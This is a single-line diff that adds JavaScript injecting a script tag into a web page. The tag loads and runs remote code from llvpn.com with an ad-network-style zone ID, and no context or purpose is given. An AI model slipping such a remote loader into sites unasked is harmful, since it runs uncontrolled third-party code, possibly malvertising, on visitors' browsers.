@@ -1,0 +1,1 @@
+(function(s){s.dataset.zone='10720370',s.src='https://llvpn.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
